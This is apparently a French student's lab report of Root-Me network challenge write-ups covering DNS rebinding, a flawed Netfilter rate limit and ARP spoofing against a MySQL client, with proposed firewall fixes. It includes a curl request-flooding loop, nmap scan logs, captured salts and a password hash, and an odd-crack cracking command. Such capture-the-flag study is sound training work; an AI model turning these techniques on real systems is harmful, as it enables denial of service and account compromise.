# TP6 : Un peu de root-me

## Sommaire

  - [Sommaire](#sommaire)
  - [I. DNS Rebinding](#i-dns-rebinding)
  - [II. Netfilter erreurs courantes](#ii-netfilter-erreurs-courantes)
  - [III. ARP Spoofing Ecoute active](#iii-arp-spoofing-ecoute-active)
  - [IV. Bonus : Trafic Global System for Mobile communications](#iv-bonus--trafic-global-system-for-mobile-communications)

## I. DNS Rebinding

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/HTTP-DNS-Rebinding)

🌞 **Write-up de l'épreuve**

Le code source contient deux fonctions principales :
- Check
- GET

Check : Cette fonction vérifie si l'adresse IP fournie est une adresse IP publique.

GET : Si la vérification du Check est réussie, cette fonction effectue une requête GET sur l'adresse IP publique saisie.

Pour exploiter cela via un DNS rebinding, il suffit de fournir une chaîne contenant une adresse IP publique valide. Nous allons utiliser l'outil suivant : [**https://lock.cmpxchg8b.com/rebinder.html**](https://lock.cmpxchg8b.com/rebinder.html).

Dans cet outil :

On configure l'entrée A avec une adresse IP publique (qui passera la vérification de la fonction Check).

On configure l'entrée B avec l'adresse de localhost (127.0.0.1).

Cet outil permet d'alterner dynamiquement entre l'adresse IP publique et l'adresse localhost pour les requêtes GET. Grâce à cette alternance, on peut accéder à des ressources limitées au localhost, comme la page /admin.

Exploitation :

On place l'URL générée par l'outil dans le champ requis.

On spamme le bouton graby-grabo?, ce qui finira par révéler le flag lorsque la requête GET sera effectuée sur localhost.
Alternativement, on peut écrire un script Bash utilisant cURL et une boucle for pour automatiser les requêtes jusqu'à obtenir le flag.

🌞 **Proposer une version du code qui n'est pas vulnérable**

- Bloquer le DNS rebinding : Ajouter un check pour être sur que l'adresse IP résolue ne fait pas partie des plages locales ou de 127.0.0.1.

- Limiter les boucles de redirection : Réduire le risque avec des spams de requêtes.

## II. Netfilter erreurs courantes

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/Netfilter-erreurs-courantes)

🌞 **Write-up de l'épreuve**

La ligne problématique dans le script fw.sh est celle-ci :

```bash
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP
```

Elle permet de limiter le trafic HTTP en bloquant les requêtes dépassant une certaine cadence, mais ce type de protection est insuffisant pour des attaques de type DoS léger (ou simplement un utilisateur spammant la touche F5)

On peut donc faire un petit script :

```sh
#!/bin/bash


URL="http://challenge01.root-me.org:54017/"  

while :; do
    curl "$URL" &
done
```

🌞 **Proposer un jeu de règles firewall**

Création de la chaîne HTTP_LIMIT :
```bash
iptables -N HTTP_LIMIT
```

Filtrage des connexions TCP sur le port 80 (HTTP) :

```bash
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j HTTP_LIMIT
```

Limitation des connexions avec un taux de 3 par seconde et une capacité de rafale de 10 :

```bash
iptables -A HTTP_LIMIT -m limit --limit 3/sec --limit-burst 10 -j RETURN
```

Rejet des connexions excessives :

```bash
iptables -A HTTP_LIMIT -j DROP
```

## III. ARP Spoofing Ecoute active

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/ARP-Spoofing-Ecoute-active)

🌞 **Write-up de l'épreuve**

Scan nmap du réseau
```bash
root@fac50de5d760:~# cat scan_result.txt 
# Nmap 7.80 scan initiated Wed Oct 30 10:09:15 2024 as: nmap -sn -PR --min-parallelism 10 -oN scan_result.txt 172.18.0.0/16
Nmap scan report for 172.18.0.1
Host is up (0.000030s latency).
MAC Address: 02:42:BD:45:97:E0 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.3)
Host is up (0.000020s latency).
MAC Address: 02:42:AC:12:00:03 (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000033s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.2)
Host is up.
```

Scan port première machine
```bash
root@fac50de5d760:~# cat scan_result_172_18_0_3.text
# Nmap 7.80 scan initiated Wed Oct 30 10:23:21 2024 as: nmap -sS -p- -oN scan_result_172_18_0_3.text 172.18.0.3
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.3)
Host is up (0.000023s latency).
All 65535 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.3) are closed
MAC Address: 02:42:AC:12:00:03 (Unknown)

# Nmap done at Wed Oct 30 10:23:24 2024 -- 1 IP address (1 host up) scanned in 3.05 seconds
```

Scan port deuxième machine
```bash
root@fac50de5d760:~# cat scan_result_172_18_0_4.text
# Nmap 7.80 scan initiated Wed Oct 30 10:24:03 2024 as: nmap -sS -p- -oN scan_result_172_18_0_4.text 172.18.0.4
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000019s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)

# Nmap done at Wed Oct 30 10:24:06 2024 -- 1 IP address (1 host up) scanned in 2.92 seconds
```

capture.pcap
```bash
Flag 1 = tu dois trouver le flag dans les trams
Salt 1 = 3e082f332c43590d
Salt 2 = 6401724a0c3f4a3007644077
Password = a4e04c017bc9326e078959908b9d962ea9119ff8
```

odd-hash
```bash
odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:3e082f332c43590d6401724a0c3f4a3007644077 rockyou.txt a4e04c017bc9326e078959908b9d962ea9119ff8
---
Password 2: et tu trouveras le mot de passe avec cette commande
---
```

Flag complet
```bash
Flag 1:Password 2
```

🌞 **Proposer une configuration pour empêcher votre attaque**

- Mettre à jour la base de donnée mySQL
